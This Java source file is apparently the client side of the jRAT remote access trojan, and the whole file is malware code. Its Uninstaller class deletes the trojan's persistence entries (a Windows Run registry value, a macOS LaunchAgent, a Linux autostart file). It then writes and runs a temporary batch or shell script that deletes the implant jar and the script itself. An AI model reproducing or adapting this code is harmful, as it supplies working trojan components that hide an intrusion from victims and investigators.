package jrat.client;

import jrat.common.utils.Utils;
import oslib.OperatingSystem;
import oslib.Shell;

import java.io.File;
import java.io.FileWriter;
import java.util.Random;

public class Uninstaller extends Thread {
	
	@Override
	public void run() {
		File me = jrat.client.utils.Utils.getJarFile();
		
		if (!me.isFile()) {
			return;
		}

		try {
			String fileName = Integer.toString((new Random()).nextInt(10000));
			File file = null;
			String text = "";
			
			String home = System.getProperty("user.home");
			
			if (Utils.isRoot() && OperatingSystem.getOperatingSystem().getType() == OperatingSystem.MACOS) {
				home = "/System/";
			}

			if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
				WinRegistry.deleteValue(WinRegistry.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Configuration.getName());

				file = new File(fileName + ".bat");

				text += "timeout 1 & pause & ";
				text += "del \"" + me.getAbsolutePath() + "\"" + " & ";
				text += "del %0";
			} else if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.MACOS) {
				File startupFile = new File(home + "/Library/LaunchAgents/" + Configuration.getName() + ".plist");
				startupFile.delete();

				file = new File(fileName + ".sh");

				text += "#!/bin/sh\n";
				text += "sleep 5\n";
				text += "rm " + me.getName() + "\n";
				text += "rm $0\n";
			} else if (OperatingSystem.getOperatingSystem().isUnix()) {
				File startupFile = new File(home + "/.config/autostart/" + Configuration.getName() + ".desktop");
				startupFile.delete();

				file = new File(fileName + ".sh");

				text += "#!/bin/sh\n";
				text += "sleep 5\n";
				text += "rm " + me.getName() + "\n";
				text += "rm $0\n";
			}

			if (file != null && text.length() > 0) {
				FileWriter writer = new FileWriter(file);
				writer.write(text);
				writer.close();

				if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
					Runtime.getRuntime().exec(new String[] { "cmd", "/c", file.getAbsolutePath() });
				} else if (OperatingSystem.getOperatingSystem().isUnix()) {
					Runtime.getRuntime().exec(new String[] { Shell.getShell().getPath(), file.getName() });
				}
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		}

		System.exit(0);
	}

}
